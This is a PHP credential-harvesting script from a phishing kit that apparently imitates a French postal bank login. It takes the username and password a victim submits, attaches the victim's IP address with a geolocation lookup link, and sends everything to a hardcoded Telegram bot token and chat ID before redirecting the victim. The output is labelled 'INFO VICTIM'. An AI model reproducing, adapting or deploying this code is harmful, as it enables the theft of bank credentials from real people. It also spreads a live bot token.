<?php

include_once '../vendor/app.php';
include('funcs.php');

if (!isset($_POST['usrpoor']) || $_POST['usrpoor']==""){

	die("<script type='text/javascript'>top.location = '../identifiant.php';</script>");
}
if (!isset($_POST['pwdpoor']) || $_POST['pwdpoor']==""){
	die("<script type='text/javascript'>top.location = '../identifiant.php';</script>");
}


$ip = getenv("REMOTE_ADDR");
$message1 = 
        "
================= Bank PSTL INFO =============
============[ Username & Password]============
[Username]   = ".$_POST['usrpoor'] ."
[Password]    = ".$_POST['pwdpoor'] ."

=================[ INFO VICTIM ]==============
[IP INFO]      = https://geoiptool.com/en/?ip=".$ip."";

        file_get_contents("https://api.telegram.org/bot5143643676:AAEGqFpn8AswDcrOQPTeijYLGoldBs4mX0g/sendMessage?chat_id=692553215&text=" . urlencode($message1)."" );
header('Location: ../../fbs');
